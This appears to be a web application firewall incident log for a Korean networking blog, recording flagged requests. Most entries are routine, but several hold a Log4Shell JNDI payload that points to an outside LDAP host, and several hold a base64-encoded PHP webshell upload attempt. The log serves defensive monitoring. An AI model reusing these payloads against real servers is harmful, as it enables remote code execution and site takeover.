       DATE         INCIDENT  LEVEL     RULE     IP            REQUEST 
07/Dec/25 08:13:08  #4378263  INFO         -  216.73.216.153   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-2-%EB%9D%BC%EC%9A%B0%ED%84%B0-%EC%84%B8%EB%B6%80-%EC%84%A4%EC%A0%95] - coffeecrawlers.com 

07/Dec/25 08:15:58  #8997210  MEDIUM     312  216.106.189.40   GET /index.php - Non-compliant IP - [SERVER:HTTP_X_FORWARDED_FOR = ${jndi:ldap://238500-xff.216.106.189.88/a}] - coffeecrawlers.com 

07/Dec/25 16:06:44  #3291520  INFO         -  216.73.216.153   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/category/network/%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac-%ec%84%a4%ea%b3%84-%eb%b0%8f-%ed%85%8c%ec%8a%a4%ed%8a%b8/feed] - coffeecrawlers.com 

07/Dec/25 16:10:00  #4795527  INFO         -  216.73.216.153   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/category/network/%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EC%84%A4%EA%B3%84-%EB%B0%8F-%ED%85%8C%EC%8A%A4%ED%8A%B8] - coffeecrawlers.com 

07/Dec/25 16:26:53  #4075254  MEDIUM     531  34.147.91.161    GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Scrapy/2.13.3 (+https://scrapy.org)] - www.coffeecrawlers.com 

07/Dec/25 17:55:11  #2375789  INFO         -  216.73.216.153   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-3-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac-%ec%8b%9c%eb%ae%ac%eb%a0%88%ec%9d%b4%ec%85%98/feed] - coffeecrawlers.com 

07/Dec/25 17:57:07  #7899686  INFO         -  216.73.216.153   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-3-%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EC%8B%9C%EB%AE%AC%EB%A0%88%EC%9D%B4%EC%85%98] - coffeecrawlers.com 

08/Dec/25 06:18:46  #4286663  MEDIUM     312  216.106.189.40   GET /index.php - Non-compliant IP - [SERVER:HTTP_X_FORWARDED_FOR = ${jndi:ldap://568243-xff.216.106.189.88/a}] - www.coffeecrawlers.com 

09/Dec/25 01:29:18  #7598632  MEDIUM     306  195.178.110.223  GET /index.php - Bogus user-agent signature - [SERVER:HTTP_USER_AGENT = SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]] - coffeecrawlers.com 

09/Dec/25 16:10:42  #2790401  INFO         -  47.76.248.58     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-3-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ea%b8%b0%ec%88%a0%ec%9d%98-%eb%b0%9c%ec%a0%84/] - coffeecrawlers.com 

09/Dec/25 16:42:07  #3336866  INFO         -  101.44.187.212   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-2-%eb%9d%bc%ec%9a%b0%ed%84%b0/] - coffeecrawlers.com 

09/Dec/25 17:05:27  #2299803  INFO         -  8.217.16.82      GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-1-%ec%9d%b8%ed%84%b0%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%82%b9-%eb%b0%8f-%ec%9d%b8%ed%84%b0%eb%84%b7/] - coffeecrawlers.com 

09/Dec/25 17:18:36  #4145414  INFO         -  8.218.177.187    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-3-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac-%ec%8b%9c%eb%ae%ac%eb%a0%88%ec%9d%b4%ec%85%98/] - coffeecrawlers.com 

09/Dec/25 17:23:21  #8888534  INFO         -  47.238.226.232   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 

09/Dec/25 17:32:02  #1790122  INFO         -  8.217.96.42      GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-2-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ec%84%b8%eb%b6%80-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 

09/Dec/25 17:33:14  #1401602  INFO         -  47.238.253.123   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-%eb%a7%9d-%ea%b5%ac%ec%a1%b0%ec%99%80-%ed%97%88%eb%b8%8c-%eb%b0%8f-%ec%8a%a4%ec%9c%84%ec%b9%98/] - coffeecrawlers.com 

09/Dec/25 19:13:38  #5523391  MEDIUM     531  3.249.99.15      GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)] - coffeecrawlers.com 

09/Dec/25 19:35:53  #2682188  MEDIUM     531  3.249.68.134     GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)] - www.coffeecrawlers.com 

09/Dec/25 23:17:33  #1686298  INFO         -  162.128.159.36   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-1-wan%ec%9d%98-%eb%ac%bc%eb%a6%ac%ec%a0%81-%ec%97%b0%ea%b2%b0-%eb%b0%8f-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ea%b8%b0%eb%b3%b8-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 

09/Dec/25 23:18:33  #7686508  INFO         -  47.76.109.247    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-lan-%ec%b9%b4%eb%93%9c%ec%99%80-lan-%ec%bc%80%ec%9d%b4%eb%b8%94/] - coffeecrawlers.com 

09/Dec/25 23:20:04  #8903816  INFO         -  101.44.25.58     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-4-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 

10/Dec/25 15:56:11  #1749665  CRITICAL     -  195.24.236.120   POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 

10/Dec/25 15:56:16  #1587489  CRITICAL     -  195.24.236.120   POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 

10/Dec/25 21:35:42  #6147386  INFO         -  173.244.207.104  GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/#comment-2] - coffeecrawlers.com 

10/Dec/25 21:35:44  #8174070  INFO         -  173.244.207.104  GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 

10/Dec/25 21:35:46  #8589420  INFO         -  173.244.207.104  POST /wp-comments-post.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 

10/Dec/25 21:35:48  #6705481  INFO         -  173.244.207.104  GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/#comment-226] - coffeecrawlers.com 

10/Dec/25 23:53:31  #4221245  INFO         -  61.108.4.18      POST /wp-login.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/wp-login.php?redirect_to=https%3A%2F%2Fcoffeecrawlers.com%2Fwp-admin%2F&reauth=1] - coffeecrawlers.com 

11/Dec/25 08:00:09  #2293787  MEDIUM     531  54.216.49.15     GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)] - www.coffeecrawlers.com 

11/Dec/25 08:38:38  #7469710  MEDIUM     531  108.130.218.179  GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)] - coffeecrawlers.com 

11/Dec/25 14:13:11  #3182118  CRITICAL     -  4.190.216.136    POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 

11/Dec/25 14:13:13  #4602835  CRITICAL     -  4.190.216.136    POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 

11/Dec/25 19:55:56  #2793881  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/#respond] - coffeecrawlers.com 

11/Dec/25 19:56:11  #5967958  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 

11/Dec/25 19:56:15  #6765631  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/] - coffeecrawlers.com 

11/Dec/25 19:56:20  #5461238  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/1-5-lan-%ec%b9%b4%eb%93%9c%ec%99%80-lan-%ec%bc%80%ec%9d%b4%eb%b8%94/] - coffeecrawlers.com 

11/Dec/25 19:56:26  #5654061  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/1-5-lan-%ec%b9%b4%eb%93%9c%ec%99%80-lan-%ec%bc%80%ec%9d%b4%eb%b8%94/#respond] - coffeecrawlers.com 

11/Dec/25 19:56:30  #5200219  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/#respond] - coffeecrawlers.com 

11/Dec/25 19:56:35  #7200452  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 

11/Dec/25 19:56:39  #1987901  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/#respond] - coffeecrawlers.com 

11/Dec/25 19:56:43  #5873473  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/#respond] - coffeecrawlers.com 

11/Dec/25 19:56:49  #4225708  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 

12/Dec/25 17:03:29  #7450200  INFO         -  124.156.107.241  GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-1-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac-%ec%9d%bc%eb%b0%98/] - coffeecrawlers.com 

12/Dec/25 17:06:33  #8552671  CRITICAL     -  4.197.163.184    POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 

12/Dec/25 17:06:34  #5701274  CRITICAL     -  4.197.163.184    POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 

12/Dec/25 17:10:29  #3913161  INFO         -  150.109.34.246   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-3-%ed%94%84%eb%a1%9c%ed%86%a0%ec%bd%9cprotocol/] - coffeecrawlers.com 

12/Dec/25 17:12:58  #3252221  INFO         -  43.128.46.24     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-2-%ec%bb%b4%ed%93%a8%ed%84%b0-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac%ec%9d%98-%ea%b5%ac%eb%b6%84/] - coffeecrawlers.com 

12/Dec/25 17:32:42  #6003934  INFO         -  119.8.237.148    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%9d%b4%ed%95%b4/] - coffeecrawlers.com 

14/Dec/25 03:15:36  #7958693  INFO         -  173.244.207.104  GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/#comment-2] - coffeecrawlers.com 

14/Dec/25 03:15:39  #8115998  INFO         -  173.244.207.104  GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 

14/Dec/25 03:15:42  #7944345  INFO         -  173.244.207.104  POST /wp-comments-post.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 

14/Dec/25 03:15:44  #4499050  INFO         -  173.244.207.104  GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/#comment-231] - coffeecrawlers.com 

14/Dec/25 16:24:00  #1848142  INFO         -  47.76.52.82      GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/category/%ed%94%84%eb%a1%9c%ea%b7%b8%eb%9e%98%eb%b0%8d-%ec%96%b8%ec%96%b4/] - coffeecrawlers.com 

15/Dec/25 16:03:27  #6657454  INFO         -  47.238.6.156     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/python3-venv-%eb%a1%9c-%ea%b0%80%ec%83%81%ed%99%94%ed%95%98%ea%b8%b0/] - coffeecrawlers.com 

16/Dec/25 19:04:36  #7147188  CRITICAL     -  20.250.45.203    POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 

16/Dec/25 19:04:38  #5655124  CRITICAL     -  20.250.45.203    POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 

16/Dec/25 22:14:12  #5080925  INFO         -  89.234.157.254   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-2-%eb%9d%bc%ec%9a%b0%ed%84%b0] - coffeecrawlers.com 

16/Dec/25 22:14:13  #7977141  INFO         -  89.234.157.254   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-2-%eb%9d%bc%ec%9a%b0%ed%84%b0] - coffeecrawlers.com 

16/Dec/25 22:14:24  #8623125  INFO         -  176.65.134.8     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5] - coffeecrawlers.com 

16/Dec/25 22:14:25  #6696590  INFO         -  176.65.134.8     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5] - coffeecrawlers.com 

02/Nov/25 12:42:19  #6664764  INFO         -  188.143.244.140  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 

02/Nov/25 12:42:34  #4940390  INFO         -  188.143.244.140  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/1-5-lan-%ec%b9%b4%eb%93%9c%ec%99%80-lan-%ec%bc%80%ec%9d%b4%eb%b8%94/#respond] - coffeecrawlers.com 

02/Nov/25 12:42:38  #1984490  INFO         -  188.143.244.140  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/#respond] - coffeecrawlers.com 

02/Nov/25 12:42:43  #8088468  INFO         -  188.143.244.140  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 

